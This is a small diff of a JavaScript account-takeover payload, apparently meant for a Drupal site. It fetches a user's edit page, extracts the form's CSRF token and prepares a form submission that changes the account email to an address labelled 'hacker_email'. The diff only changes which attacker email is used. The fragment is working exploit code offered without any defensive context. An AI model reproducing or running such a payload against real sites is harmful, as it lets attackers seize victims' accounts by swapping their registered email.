@@ -8,7 +8,7 @@ fetch('/users/' + username +'/edit')
   .then(d => {
     csrfToken = (new DOMParser().parseFromString(d, 'text/html').querySelector('[id="edit-user-personal-info-form-form-token"]') || {}).value;
             
-        const email = 'hacked@byomar.com'; //hacker_email
+        const email = 'hack3dby0mar@gmail.com'; //hacker_email
         const op = 'Save';
         const formData = new FormData();
         formData.append('mail', email);
